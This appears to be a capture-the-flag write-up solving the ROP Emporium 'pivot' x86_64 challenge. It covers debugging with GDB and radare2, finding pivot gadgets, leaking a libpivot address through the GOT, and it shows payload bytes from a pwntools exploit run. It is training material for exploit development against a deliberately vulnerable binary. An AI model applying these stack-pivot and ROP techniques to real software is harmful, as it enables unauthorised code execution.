# ROP Emporium - 07 pivot x86_64

## ELF Binary Info
> $ `rabin2 -I ./pivot`  
```
arch     x86
baddr    0x400000
binsz    6973
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Run ELF Binary to Understand Required Inputs
> $ `./pivot`  
```
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f5bc24b1f10
Send a ROP chain now and it will land there
> 11111111
Thank you!

Now please send your stack smash
> 22222222
Thank you!

Exiting
```
- Having now interacted with the program, we know that two separate inputs are required, as shown in the above output
- In the above example, the 1st input was `11111111` and the 2nd input was `22222222`
- The program gives us a place to pivot our stack to `0x7f5bc24b1f10`, but if we run the program multiple times, we can see that the pivot location changes everytime we re-run the program:
> $ `./pivot`  
```
The Old Gods kindly bestow upon you a place to pivot: 0x7fe029d6bf10
[...]
The Old Gods kindly bestow upon you a place to pivot: 0x7f93d81b7f10
[...]
The Old Gods kindly bestow upon you a place to pivot: 0x7fbf2be90f10
[...]
The Old Gods kindly bestow upon you a place to pivot: 0x7fac4dd64f10
[...]
The Old Gods kindly bestow upon you a place to pivot: 0x7f00e1bbef10
[...]
The Old Gods kindly bestow upon you a place to pivot: 0x7f85ec39df10
```
- Also note that since the pivot location is printed **before** the 2nd input is requested, we are able to capture it and use it as part of the 2nd input if necessary

## Using GDB with a FIFO for Input
- Use two terminals to make it easier to send input to the running GDB process

### 1st terminal
- Make a [FIFO](https://www.man7.org/linux/man-pages/man7/fifo.7.html) using `mkfifo <name_of_fifo>`:
> $ `mkfifo my_fifo`  
- Then open ELF binary in GDB (`-q` is for quiet mode):
> $ `gdb ./pivot -q`  
- Disassemble `pwnme` function:
> (gdb) `disass pwnme`  
```
[...]
   0x000000000040091d <+44>:	mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400921 <+48>:	mov    rsi,rax
   0x0000000000400924 <+51>:	mov    edi,0x400ac8
   0x0000000000400929 <+56>:	mov    eax,0x0
   0x000000000040092e <+61>:	call   0x4006f0 <printf@plt>
   0x0000000000400933 <+66>:	mov    edi,0x400b08
   0x0000000000400938 <+71>:	call   0x4006e0 <puts@plt>
   0x000000000040093d <+76>:	mov    edi,0x400b34
   0x0000000000400942 <+81>:	mov    eax,0x0
   0x0000000000400947 <+86>:	call   0x4006f0 <printf@plt>
   0x000000000040094c <+91>:	mov    rax,QWORD PTR [rbp-0x28]
   0x0000000000400950 <+95>:	mov    edx,0x100
   0x0000000000400955 <+100>:	mov    rsi,rax
   0x0000000000400958 <+103>:	mov    edi,0x0
   0x000000000040095d <+108>:	call   0x400710 <read@plt>
   0x0000000000400962 <+113>:	mov    edi,0x400b37
   0x0000000000400967 <+118>:	call   0x4006e0 <puts@plt>
   0x000000000040096c <+123>:	mov    edi,0x400b48
   0x0000000000400971 <+128>:	call   0x4006e0 <puts@plt>
   0x0000000000400976 <+133>:	mov    edi,0x400b34
   0x000000000040097b <+138>:	mov    eax,0x0
   0x0000000000400980 <+143>:	call   0x4006f0 <printf@plt>
   0x0000000000400985 <+148>:	lea    rax,[rbp-0x20]
   0x0000000000400989 <+152>:	mov    edx,0x40
   0x000000000040098e <+157>:	mov    rsi,rax
   0x0000000000400991 <+160>:	mov    edi,0x0
   0x0000000000400996 <+165>:	call   0x400710 <read@plt>
[...]
```
- There are two calls to `read`, set breakpoint at the 2nd call to `read` so that we can easily send our second input before continuing:
> (gdb) `b *pwnme+165`  
```
Breakpoint 1 at 0x400996
```
- We also know from the line `0x000000000040094c <+91>:	mov rax,QWORD PTR [rbp-0x28]` that the memory address of where our 1st input is stored is on the stack at `rbp-0x28`, so if we dereference address `rbp-0x28` (i.e. by using a command such as `x/16gx *((void**) ($rbp-0x28))`) when we have reached the above breakpoint we will be able to see our 1st input
- Let's also print some useful info at each breakpoint by using commands below:
> (gdb) `define hook-stop`  
\>`i r`  
\>`echo Pivot:\n`  
\>`x/16gx *((void**) ($rbp-0x28))`  
\>`echo Stack:\n`  
\>`x/16gx $rsp`  
\>`x/8i $rip`  
\>`end`  
- Setup is done, so now run the program with input from the FIFO:
> (gdb) `r < my_fifo`  
- GDB is waiting for the 1st input, so go to the 2nd terminal to send the input

### 2nd terminal
- The FIFO named `my_fifo` has already been created, GDB has started running our ELF binary and it's now waiting for 1st input
- Let's simply echo some data and redirect to the FIFO (`-n` means do **not** output the trailing newline):
> $ `echo -n "00000000111111112222222233333333444444445555555566666666777777778888888899999999::::::::;;;;;;;;" > my_fifo`  
- We know from the GDB session earlier, we've set a breakpoint just before the program asks for our 2nd input, so in the other terminal GDB will now have continued execution and reached that breakpoint
- Let's therefore send our 2nd input:
> $ `echo -n "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ" > my_fifo`  
- Now go back to the 1st terminal to continue using GDB

### Back to 1st Terminal
- Now back in GDB we are at the breakpoint just **before** the program reads the 2nd input, and from the steps above we know we've already sent both 1st and 2nd inputs, but we just haven't yet executed the instruction that reads the 2nd input, so let's look at GDB's output to confirm our understanding
- Instruction pointer is `0x400996` and we're just before the `call 0x400710 <read@plt>` instruction:
```
rip            0x400996            0x400996 <pwnme+165>
[...]
=> 0x400996 <pwnme+165>:	call   0x400710 <read@plt>
   0x40099b <pwnme+170>:	mov    edi,0x400b69
```
- Pivot address `0x7fb2f2a99f10` has correctly been dereferenced and `16gx` of hex output has been printed from that pivot address. In addition, we can see that all 96 bytes of our 1st input `00000000111111112222222233333333444444445555555566666666777777778888888899999999::::::::;;;;;;;;` has successfully been stored there:
```
The Old Gods kindly bestow upon you a place to pivot: 0x7fb2f2a99f10
[...]
Pivot:
0x7fb2f2a99f10:	0x3030303030303030	0x3131313131313131
0x7fb2f2a99f20:	0x3232323232323232	0x3333333333333333
0x7fb2f2a99f30:	0x3434343434343434	0x3535353535353535
0x7fb2f2a99f40:	0x3636363636363636	0x3737373737373737
0x7fb2f2a99f50:	0x3838383838383838	0x3939393939393939
0x7fb2f2a99f60:	0x3a3a3a3a3a3a3a3a	0x3b3b3b3b3b3b3b3b
0x7fb2f2a99f70:	0x0000000000000000	0x0000000000000000
0x7fb2f2a99f80:	0x0000000000000000	0x0000000000000000
```
- From the disassembly (`0x0000000000400950 <+95>:	mov edx,0x100`), we also know that the 1st input will read up to 0x100 == 256 bytes of input

- The program hasn't read in our 2nd input yet, so we expect the stack to be also be in a state just prior to receiving that 2nd input
- Also note that for this execution `rbp-0x28 == 0x7ffd738679c0-0x28 == 0x7ffd73867998`
- Value stored at `0x7ffd73867998` is `0x00007fb2f2a99f10`, which is our pivot address
```
rbp            0x7ffd738679c0      0x7ffd738679c0
rsp            0x7ffd73867990      0x7ffd73867990
[...]
Stack:
0x7ffd73867990:	0x00007ffd73867ad0	0x00007fb2f2a99f10
0x7ffd738679a0:	0x0000000000000000	0x0000000000000000
0x7ffd738679b0:	0x0000000000000000	0x0000000000000000
0x7ffd738679c0:	0x00007ffd738679e0	0x00000000004008cc
0x7ffd738679d0:	0x00007fb2f2a99f10	0x00007fb2f1a9a010
0x7ffd738679e0:	0x0000000000000000	0x00007fb2f2ac50b3
0x7ffd738679f0:	0x0000000000000031	0x00007ffd73867ad8
0x7ffd73867a00:	0x00000001f2c86618	0x0000000000400847
```

- Execute the next instruction and analyse the output:
> (gdb) `ni`  
```
rax            0x40                64
rbx            0x4009d0            4196816
rcx            0x7fb2f2baf142      140406553243970
rdx            0x40                64
rsi            0x7ffd738679a0      140726541646240
rdi            0x0                 0
rbp            0x7ffd738679c0      0x7ffd738679c0
rsp            0x7ffd73867990      0x7ffd73867990
r8             0x2                 2
r9             0x2                 2
r10            0x400b34            4197172
r11            0x246               582
r12            0x400760            4196192
r13            0x7ffd73867ad0      140726541646544
r14            0x0                 0
r15            0x0                 0
rip            0x40099b            0x40099b <pwnme+170>
eflags         0x203               [ CF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
Pivot:
0x7fb2f2a99f10:	0x3030303030303030	0x3131313131313131
0x7fb2f2a99f20:	0x3232323232323232	0x3333333333333333
0x7fb2f2a99f30:	0x3434343434343434	0x3535353535353535
0x7fb2f2a99f40:	0x3636363636363636	0x3737373737373737
0x7fb2f2a99f50:	0x3838383838383838	0x3939393939393939
0x7fb2f2a99f60:	0x3a3a3a3a3a3a3a3a	0x3b3b3b3b3b3b3b3b
0x7fb2f2a99f70:	0x0000000000000000	0x0000000000000000
0x7fb2f2a99f80:	0x0000000000000000	0x0000000000000000
Stack:
0x7ffd73867990:	0x00007ffd73867ad0	0x00007fb2f2a99f10
0x7ffd738679a0:	0x4141414141414141	0x4242424242424242
0x7ffd738679b0:	0x4343434343434343	0x4444444444444444
0x7ffd738679c0:	0x4545454545454545	0x4646464646464646
0x7ffd738679d0:	0x4747474747474747	0x4848484848484848
0x7ffd738679e0:	0x0000000000000000	0x00007fb2f2ac50b3
0x7ffd738679f0:	0x0000000000000031	0x00007ffd73867ad8
0x7ffd73867a00:	0x00000001f2c86618	0x0000000000400847
=> 0x40099b <pwnme+170>:	mov    edi,0x400b69
   0x4009a0 <pwnme+175>:	call   0x4006e0 <puts@plt>
   0x4009a5 <pwnme+180>:	nop
   0x4009a6 <pwnme+181>:	leave  
   0x4009a7 <pwnme+182>:	ret    
   0x4009a8 <uselessFunction>:	push   rbp
   0x4009a9 <uselessFunction+1>:	mov    rbp,rsp
   0x4009ac <uselessFunction+4>:	call   0x400720 <foothold_function@plt>
```
- Now we can see that our 2nd input has now only partially been stored on the stack, we've actually overwritten the base pointer and the return address on the stack (`0x4848484848484848 == HHHHHHHH`)
- If we continue execution, we will segfault:
> (gdb) `c`  
```
Continuing.
Thank you!

Program received signal SIGSEGV, Segmentation fault.
rax            0xb                 11
rbx            0x4009d0            4196816
rcx            0x7fb2f2baf1e7      140406553244135
rdx            0x0                 0
rsi            0x7fb2f2c8a723      140406554142499
rdi            0x7fb2f2c8c4c0      140406554150080
rbp            0x4545454545454545  0x4545454545454545
rsp            0x7ffd738679c8      0x7ffd738679c8
r8             0xb                 11
r9             0x2                 2
r10            0x400b34            4197172
r11            0x246               582
r12            0x400760            4196192
r13            0x7ffd73867ad0      140726541646544
r14            0x0                 0
r15            0x0                 0
rip            0x4009a7            0x4009a7 <pwnme+182>
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
[...]
```
- Analysis of what happened to our 2nd input `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJ`:
  - Only part of our 2nd input was stored on the stack, up to and including `HHHHHHHH`, but everything else was ignored. This is because the 2nd call to `read` only accepts 0x40 == 64 bytes of input, as shown in the disassembly line `0x0000000000400989 <+152>:	mov edx,0x40`.
  - The first 32 bytes of the 2nd input doesn't affect anything, but the following 8 bytes `EEEEEEEE` was where the base pointer was stored.
  - After the base pointer, `FFFFFFFF` was where the return address was stored.
  - After the return address, only `GGGGGGGGHHHHHHHH` was captured and the rest of the 2nd input was ignored.
  - Therefore we only have room for 3 ROP gadgets (or more precisely, 24 bytes), i.e. where `FFFFFFFFGGGGGGGGHHHHHHHH` was situated in our 2nd input.
- So as hinted at every point in the challenge, we should perform a stack pivot to give extra room for more gadgets
- In the next section we will search for ROP gadgets that we can use and build the ROP chain

## Building ROP Chain
- Open the ELF binary in radare2:
> $ `r2 -A ./pivot`  
- We want to control the stack pointer, so let's search for gadgets that include `rsp`:
> [0x00400760]> `/R rsp`  
```
[...]
  0x004009bb                 58  pop rax
  0x004009bc                 c3  ret
  0x004009bd               4894  xchg rax, rsp
  0x004009bf                 c3  ret
[...]
```
- The above gadgets are suitable for our 2nd input as we can use `pop rax` followed by the address to pivot to, then lastly `xchg rax, rsp` to get our desired pivot location into rsp (this is a total of 24 bytes, it's as if the maker of this challenge had planned it this way...)
- With the above ROP chain used as our 2nd input, the stack will have pivoted to where our 1st input was placed, so what ROP chain should we place there?
- Let's perform some further analysis on the binary using radare2, first by searching for functions:
> [0x00400760]> `afl`  
```
[...]
0x004009a8    1 19           sym.uselessFunction
0x00400720    1 6            sym.imp.foothold_function
[...]
```
- Disassemble `uselessFunction` to see what it does:
> [0x00400760]> `pdf @ sym.uselessFunction`  
```
╭ 19: sym.uselessFunction ();
│           0x004009a8      55             push rbp
│           0x004009a9      4889e5         mov rbp, rsp
│           0x004009ac      e86ffdffff     call sym.imp.foothold_function
│           0x004009b1      bf01000000     mov edi, 1                  ; int status
╰           0x004009b6      e895fdffff     call sym.imp.exit           ; void exit(int status)
```
- `uselessFunction` calls `foothold_function` then just exits
- `foothold_function` is an imported function, as it is prefixed by `sym.imp.` so lookup the address in PLT by printing info on imports and performing an internal grep:
> [0x00400760]> `ii ~ foothold_function`  
```
8   0x00400720 GLOBAL FUNC       foothold_function
```
- Therefore `foothold_function`'s PLT location is `0x400720`
- Disassemble 3 lines at `sym.imp.foothold_function`:
> [0x00400760]> `pd3 @ sym.imp.foothold_function`  
```
        ╎   ; CALL XREF from sym.uselessFunction @ 0x4009ac
╭ 6: sym.imp.foothold_function ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
╰       ╎   0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726 ; "&\a@"
        ╎   0x00400726      6805000000     push 5                      ; 5
        ╰─< 0x0040072b      e990ffffff     jmp sym..plt
```
- Here we can see `foothold_function`'s GOT location is `0x601040`
- But what does `foothold_function` even do? Quit radare2 using `q` key as many times as necessary then open the libpivot shared object file in radare2:
> $ `r2 -A ./libpivot.so`  
- Disassemble `foothold_function`:
[0x00000890]> `pdf @ sym.foothold_function`  
```
╭ 19: sym.foothold_function ();
│           0x0000096a      55             push rbp
│           0x0000096b      4889e5         mov rbp, rsp
│           0x0000096e      488d3dab0100.  lea rdi, str.foothold_function__:_Check_out_my_.got.plt_entry_to_gain_a_foothold_into_libpivot ; sym..rodata
│                                                                      ; 0xb20 ; "foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot" ; const char *s
│           0x00000975      e8b6feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000097a      90             nop
│           0x0000097b      5d             pop rbp
╰           0x0000097c      c3             ret
```
- As it turns out, it doesn't seem to directly provide any benefit except for a potential `pop rbp` gadget, but maybe the library includes something else that might be of use, so list all functions:
> [0x00000890]> `afl`  
```
0x00000890    4 50   -> 40   entry0
0x0000096a    1 19           sym.foothold_function
[...]
0x00000a81    3 146          sym.ret2win
[...]
```
- `ret2win` looks like a winner, so disassemble it to confirm:
[0x00000890]> `pdf @ sym.ret2win`  
```
╭ 146: sym.ret2win ();
│           ; var file*stream @ rbp-0x38
│           ; var char *s @ rbp-0x30
│           ; var int64_t var_8h @ rbp-0x8
│           0x00000a81      55             push rbp
│           0x00000a82      4889e5         mov rbp, rsp
│           0x00000a85      4883ec40       sub rsp, 0x40
│           0x00000a89      64488b042528.  mov rax, qword fs:[0x28]
│           0x00000a92      488945f8       mov qword [var_8h], rax
│           0x00000a96      31c0           xor eax, eax
│           0x00000a98      48c745c80000.  mov qword [stream], 0
│           0x00000aa0      488d35df0000.  lea rsi, [0x00000b86]       ; "r" ; const char *mode
│           0x00000aa7      488d3dda0000.  lea rdi, str.flag.txt       ; 0xb88 ; "flag.txt" ; const char *filename
│           0x00000aae      e8adfdffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x00000ab3      488945c8       mov qword [stream], rax
│           0x00000ab7      48837dc800     cmp qword [stream], 0
│       ╭─< 0x00000abc      7516           jne 0xad4
│       │   0x00000abe      488d3dcc0000.  lea rdi, str.Failed_to_open_file:_flag.txt ; 0xb91 ; "Failed to open file: flag.txt" ; const char *s
│       │   0x00000ac5      e866fdffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x00000aca      bf01000000     mov edi, 1                  ; int status
│       │   0x00000acf      e89cfdffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from sym.ret2win @ 0xabc
│       ╰─> 0x00000ad4      488b55c8       mov rdx, qword [stream]     ; FILE *stream
│           0x00000ad8      488d45d0       lea rax, [s]
│           0x00000adc      be21000000     mov esi, 0x21               ; '!' ; int size
│           0x00000ae1      4889c7         mov rdi, rax                ; char *s
│           0x00000ae4      e867fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x00000ae9      488d45d0       lea rax, [s]
│           0x00000aed      4889c7         mov rdi, rax                ; const char *s
│           0x00000af0      e83bfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00000af5      488b45c8       mov rax, qword [stream]
│           0x00000af9      4889c7         mov rdi, rax                ; FILE *stream
│           0x00000afc      e83ffdffff     call sym.imp.fclose         ; int fclose(FILE *stream)
│           0x00000b01      48c745c80000.  mov qword [stream], 0
│           0x00000b09      bf00000000     mov edi, 0                  ; int status
╰           0x00000b0e      e85dfdffff     call sym.imp.exit           ; void exit(int status)
```
- It opens flag.txt and prints it out, so now we have a potential solution, which will involve looping back to the beginning of the program:
  - In the 1st input of the 1st program loop iteration we need to:
    - Call `foothold_function` from the PLT to resolve its memory address
    - Print the resolved location of `foothold_function` by placing the GOT pointer into rdi and then immediately calling `puts` afterwards (note that we must capture this printed resolved address of `foothold_function` for use later)
    - Return back the very start of the program, but this time we know the location of all the imported libpivot addresses because their positions are relative to the resolved address of `foothold_function`
  - In the 2nd input of the 1st program loop iteration we place 40 bytes of padding (because the rbp value isn't important) then followed by our ROP chain that pivots the stack to where our 1st input is stored
  - In the 1st input of the 2nd program loop iteration we can put anything here, as it won't be used
  - In the 2nd input of the 2nd program loop iteration we place 40 bytes of padding (because the rbp value isn't important) then followed by the resolved address of `foothold_function` which we leaked in the 1st program loop iteration
- With the plan in place, we just need memory addresses for `start`, `pop_rdi`, `puts_plt` and the address of `ret2win` relative to `foothold_function`, so quit radare2 then open the main ELF binary in radare2 again:
> $ `r2 -A ./pivot`  
- When we've just opened the binary in radare2 the seek point is already at the program's entry point `0x400760` (our `start` location to loop back to), which we can confirm using `ie`:
> [0x00400760]> `ie`  
```
[Entrypoints]
vaddr=0x00400760 paddr=0x00000760 haddr=0x00000018 hvaddr=0x00400018 type=program

1 entrypoints
```
- Now search for the `pop rdi` gadget, which we find out is at `0x400a33`:
> [0x00400760]> `/R pop rdi`  
```
  0x00400a33                 5f  pop rdi
  0x00400a34                 c3  ret
```
- Then get the location of `puts` in the PLT, which we find out is at `0x4006e0`:
> [0x00400760]> `ii ~ puts`  
```
2   0x004006e0 GLOBAL FUNC       puts
```
- Lastly, quit radare2 and move on to the next section where we'll get the address of `ret2win` relative to `foothold_function`

## Address of `ret2win` Relative to `foothold_function`
- We'll use [`nm`](https://www.man7.org/linux/man-pages/man1/nm.1.html) to find the offset
> $ `nm -D ./libpivot.so`  
```
[...]
000000000000096a T foothold_function
[...]
0000000000000a81 T ret2win
```
- 0xa81-0x96a == 0x117 == 279
- i.e. resolved `foothold_function` address + 0x117 == `ret2win` address
- All the pieces of the puzzle have been collected, so just write a Python script to get the flag

## Python Script to Get the Flag
- The [get_flag.py](./get_flag.py) Python script (using [Pwntools](https://github.com/Gallopsled/pwntools)) is included for reference. Run it from the same directory as the challenge files:
> $ `python get_flag.py`  
```
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f60a185ef10
Stack pivot: 0x7f60a185ef10
Send a ROP chain now and it will land there
> b' \x07@\x00\x00\x00\x00\x003\n@\x00\x00\x00\x00\x00@\x10`\x00\x00\x00\x00\x00\xe0\x06@\x00\x00\x00\x00\x00`\x07@\x00\x00\x00\x00\x00'
Thank you!

Now please send your stack smash
> b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\xf0\x85\xa1`\x7f\x00\x00\xbb\t@\x00\x00\x00\x00\x00\x10\xef\x85\xa1`\x7f\x00\x00\xbd\t@\x00\x00\x00\x00\x00'
Thank you!
foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot

foothold_function address: 0x7f60a1a6196a
b'\x90\x90\x90\x90\x90\x90\x90\x90'
Thank you!

Now please send your stack smash
> b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x81\x1a\xa6\xa1`\x7f\x00\x00'
Thank you!
ROPE{a_placeholder_32byte_flag!}
```
